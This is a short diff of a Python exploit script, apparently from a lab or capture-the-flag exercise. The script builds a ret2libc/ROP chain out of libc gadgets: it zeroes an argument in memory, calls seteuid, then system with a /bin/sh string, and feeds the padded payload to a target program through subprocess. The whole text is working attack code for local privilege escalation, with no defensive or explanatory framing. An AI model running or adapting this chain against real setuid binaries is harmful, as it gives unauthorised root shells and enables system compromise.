@@ -3,9 +3,7 @@ import struct
 import subprocess
 #All of these gadgets are from libc
 #0x00032140: xor eax, eax; ret; 
-#0x0002bc87: pop eax; ret; 
 #0x0001d144: ret;
-#0x0001ec65: pop ebx; ret; 
 #0x0002cf59: mov dword ptr [ecx], eax; pop ebx; ret; 
 #0x0002a413: pop ecx; ret; 
 
@@ -42,10 +40,9 @@ addr_to_arg1 = struct.pack("I", addr_to_arg1)
 chain = ret + xor_eax_eax + pop_ecx + addr_to_arg1 + mov_dwordptr_ecx_eax__pop_ebx + "JUNK" 
 """ret2libc chain""" 
 chain += seteuid + pop_ecx + "ARG1"
-chain += system + exit + bin_sh
-"""final chain"""
+chain += system + exit + bin_shex
+"""final payload"""
 payload = padding + chain 
 """Execute"""
-#print payload
 subprocess.call([prog, payload])
 
